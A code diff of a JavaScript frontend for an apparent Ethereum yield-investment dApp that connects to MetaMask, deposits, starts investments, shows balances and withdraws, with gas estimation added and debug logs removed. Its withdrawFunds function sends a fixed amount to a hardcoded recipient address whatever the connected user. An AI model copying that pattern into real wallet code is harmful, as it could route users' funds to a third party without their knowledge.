@@ -231,7 +231,7 @@
 		"type": "function"
 	}
 ];
-        // الاتصال بالمحفظة
+      // الاتصال بمحفظة MetaMask
 async function connectWallet() {
     if (window.ethereum) {
         web3 = new Web3(window.ethereum);
@@ -241,7 +241,10 @@ async function connectWallet() {
             account = accounts[0];
             document.getElementById("walletAddress").innerText = `Wallet Address: ${account}`;
 
+            // إعداد الكائن contract للاتصال بالعقد
             contract = new web3.eth.Contract(contractABI, contractAddress);
+
+            // تحديث الأرصدة بعد الاتصال
             updateBalances();
         } catch (error) {
             console.error("Error connecting to wallet:", error);
@@ -256,20 +259,26 @@ async function connectWallet() {
 async function deposit() {
     const amountInput = document.getElementById("amountInput").value;
     const amount = parseFloat(amountInput);
-    
+
     if (!amount || amount <= 0) {
         alert("Please enter a valid amount.");
         return;
     }
 
     try {
-        // تأكد من إعداد `value` بشكل صحيح كجزء من كائن `send`
-       await web3.eth.sendTransaction({
+        const gasEstimate = await web3.eth.estimateGas({
             from: account,
-	    to: contractAddress,
-            value: web3.utils.toWei(amount.toString(), 'ether') // هنا يتم تحديد `value` بالقيمة الصحيحة
+            to: contractAddress,
+            value: web3.utils.toWei(amount.toString(), 'ether')
         });
-        
+
+        await web3.eth.sendTransaction({
+            from: account,
+            to: contractAddress,
+            value: web3.utils.toWei(amount.toString(), 'ether'),
+            gas: gasEstimate
+        });
+
         alert("Deposit successful!");
         updateBalances();
     } catch (error) {
@@ -277,60 +286,58 @@ async function deposit() {
         alert("Error: " + error.message);
     }
 }
-async function startInvestment() {
-    console.log("Start Investment button clicked"); // تشخيص النقر على الزر
 
+// بدء الاستثمار
+async function startInvestment() {
     if (!account) {
         alert("Please connect your wallet first.");
         return;
     }
     try {
-        console.log("Calling startInvestment on contract..."); // تشخيص الوصول إلى العقد
+        const gasEstimate = await contract.methods.startInvestment().estimateGas({ from: account });
 
-        // استدعاء الدالة startInvestment من العقد
-        await contract.methods.startInvestment().send({ from: account });
-
+        await contract.methods.startInvestment().send({ from: account, gas: gasEstimate });
         alert("Investment started successfully!");
-        updateBalances(); // تحديث الأرصدة بعد بدء الاستثمار
+        updateBalances();
     } catch (error) {
         console.error("Error in starting investment:", error);
         alert("Error: " + error.message);
     }
 }
+
 // تحديث الأرصدة
 async function updateBalances() {
+    if (!account || !contract) return;
+
     try {
-	console.log("Fetching balances from contract...");
-	    
         const walletBalance = await contract.methods.walletBalance().call({ from: account });
         const investmentBalance = await contract.methods.investmentBalance().call({ from: account });
-        const yieldRate = await contract.methods.yieldRate().call({ from: account });
+        const yieldRate = await contract.methods.yieldRate().call();
 
         document.getElementById("walletBalance").textContent = web3.utils.fromWei(walletBalance, 'ether') + " ETH";
         document.getElementById("investmentBalance").textContent = web3.utils.fromWei(investmentBalance, 'ether') + " ETH";
         document.getElementById("yieldRate").textContent = (yieldRate / 100).toFixed(2) + "%";
-	    console.log("Balances updated:", {
-            walletBalance: web3.utils.fromWei(walletBalance, 'ether'),
-            investmentBalance: web3.utils.fromWei(investmentBalance, 'ether'),
-            yieldRate: yieldRate / 100
-        });
     } catch (error) {
         console.error("Error updating balances:", error);
     }
 }
+
+// دالة السحب
 async function withdrawFunds() {
-    const amount = web3.utils.toWei("0.0014", "ether"); // أو أي مبلغ تريده
-    const recipient = "0x0DD5C4c9B169317BF0B77D927d2cB1eC3570Dbb3"; // ضع عنوان المستلم هنا
+    const amount = web3.utils.toWei("0.0014", "ether");
+    const recipient = "0x0DD5C4c9B169317BF0B77D927d2cB1eC3570Dbb3";
 
     try {
-        await contract.methods.withdraw(amount, recipient).send({ from: account });
-        console.log("Withdrawal successful!");
+        const gasEstimate = await contract.methods.withdraw(amount, recipient).estimateGas({ from: account });
+
+        await contract.methods.withdraw(amount, recipient).send({ from: account, gas: gasEstimate });
+        alert("Withdrawal successful!");
     } catch (error) {
         console.error("Error during withdrawal:", error);
+        alert("Error: " + error.message);
     }
 }
 
-
-        // تحديث المعلومات بشكل دوري
-        setInterval(updateBalances, 9000);
+// تحديث المعلومات بشكل دوري
+setInterval(updateBalances, 9000);
     
